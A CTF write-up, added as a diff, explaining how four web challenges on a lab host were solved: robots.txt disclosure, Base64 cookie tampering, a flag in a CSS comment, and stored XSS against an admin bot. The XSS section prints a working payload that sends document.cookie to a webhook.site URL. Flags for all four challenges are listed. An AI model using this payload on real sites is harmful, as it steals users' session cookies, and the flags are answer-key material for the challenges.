@@ -1,0 +1,144 @@
+Web CTF Master Write-up (Challenges 9 to 12)
+
+============================================================
+Challenge 9: InsIIT
+Target: http://10.0.118.48:9999
+============================================================
+
+What hinted the vulnerability:
+- Homepage looked like a normal static promo page and did not expose obvious functionality.
+- In CTF web recon, `robots.txt` is a common place for accidental hints, so that was checked early.
+
+What I tried during recon:
+- Enumerated common endpoints: `/robots.txt`, `/sitemap.xml`, `/admin`, `/login`, `/register`, `/api`, `/.git/HEAD`.
+- Most routes returned nothing useful / not found.
+- `robots.txt` gave a direct clue:
+  Disallow: /fade/to/black
+
+Exploit path (what worked):
+1. Requested `/robots.txt`.
+2. Extracted hidden path `/fade/to/black`.
+3. Visited that path directly.
+4. Flag was returned in response body.
+
+Vulnerability type:
+- Information disclosure / security-through-obscurity failure.
+- Sensitive route was "hidden" in public crawler metadata.
+
+Flag:
+cns431{you_snoopy_doo_didnt_i_tell_you_to_get_off_my_lawn}
+
+Automation used:
+- `9-insiit.py` fetches `robots.txt`, parses `Disallow`, requests the hidden path, prints response.
+
+
+============================================================
+Challenge 10: oreo
+Target: http://10.0.118.48:8888
+============================================================
+
+What hinted the vulnerability:
+- Prompt text itself: "One wrong cookie and the peace treaty is broken."
+- That strongly suggests cookie tampering.
+
+What I tried during recon:
+- Inspected raw response headers from `/`.
+- Found:
+  Set-Cookie: flavour=c3RyYXdiZXJyeQ%3D%3D
+- Decoded value from Base64 => `strawberry`.
+- Tested alternate values (`oreo`, `admin`, `flag`, etc.) and common endpoints (`/flag`, `/admin`, `/api/flag`).
+- Endpoints mostly 404, so the key likely remained cookie logic on root route.
+
+Exploit path (what worked):
+1. Replaced cookie value with Base64(`chocolate`) => `Y2hvY29sYXRl`.
+2. Sent request to `/` with:
+   Cookie: flavour=Y2hvY29sYXRl
+3. Server returned the flag directly in body.
+
+Vulnerability type:
+- Insecure client-side trust / cookie tampering.
+- Cookie was merely encoded, not signed or integrity-protected.
+
+Flag:
+ican{1ick_twi5t_dunk}
+
+Automation used:
+- `10-oreo.py` sends tampered cookie and prints returned response.
+
+
+============================================================
+Challenge 11: events
+Target: http://10.0.118.48:7777
+============================================================
+
+What hinted the vulnerability:
+- Every path tested returned the same event page, suggesting a deliberately minimal surface.
+- Page source referenced a static stylesheet: `/static/style.css`.
+- In CTFs, comments in static assets often hide clues.
+
+What I tried during recon:
+- Enumerated many likely routes (`/admin`, `/api`, `/flag`, `/secret`, `/robots.txt`, etc.).
+- Checked query params and request headers (`X-Forwarded-For`, host tricks, admin-like cookies) for behavior changes.
+- No dynamic changes appeared from those inputs.
+- Pulled `/static/style.css` and inspected content.
+
+Exploit path (what worked):
+1. Requested `/static/style.css`.
+2. Found embedded CSS comment:
+   /* br@V0---{yoU_F0und_m3} */
+3. Extracted comment value as flag.
+
+Vulnerability type:
+- Information disclosure via exposed static source comments.
+
+Flag:
+br@V0---{yoU_F0und_m3}
+
+Automation used:
+- `11-events.py` fetches stylesheet and extracts first CSS comment.
+
+
+============================================================
+Challenge 12: CNSxSS
+Target: http://10.0.118.48:4444
+============================================================
+
+What hinted the vulnerability:
+- Name itself: "CNSxSS" strongly hints XSS.
+- App lets users create notes and then has a "Send to Overlords!" report flow (classic admin-bot pattern).
+
+What I tried during recon:
+- Created a normal note and inspected note page source.
+- Found dangerous rendering pattern:
+  - `const note = "...";`
+  - `note_el.innerHTML = clean;`
+- Verified payload break-out with test note content like `";alert(1);//` (confirmed it injects executable JS in script context).
+- First blind exfil attempts with larger payloads were noisy/fragile.
+- Pivoted to a minimal stable payload that only triggers an image request to a webhook.
+
+Exploit path (what worked):
+1. Created note with payload:
+   ";new Image().src="https://webhook.site/<token>?c="+encodeURIComponent(document.cookie);//
+2. Triggered admin bot using `POST /report/<note_id>`.
+3. Admin visited malicious note and executed stored JS.
+4. Callback reached webhook; admin context leaked in request metadata.
+5. Flag observed in webhook request `User-Agent` value:
+   flag=cns431_d4ng3r_n0_val1dat1on_xss
+
+Vulnerability type:
+- Stored XSS leading to admin context exfiltration.
+
+Flag:
+cns431_d4ng3r_n0_val1dat1on_xss
+
+Automation used:
+- `12-cnsxss.py` creates webhook token, submits payload note, reports note, polls webhook API, extracts flag.
+
+
+============================================================
+Final Flags Recap
+============================================================
+1) InsIIT   : cns431{you_snoopy_doo_didnt_i_tell_you_to_get_off_my_lawn}
+2) oreo     : ican{1ick_twi5t_dunk}
+3) events   : br@V0---{yoU_F0und_m3}
+4) CNSxSS   : cns431_d4ng3r_n0_val1dat1on_xss
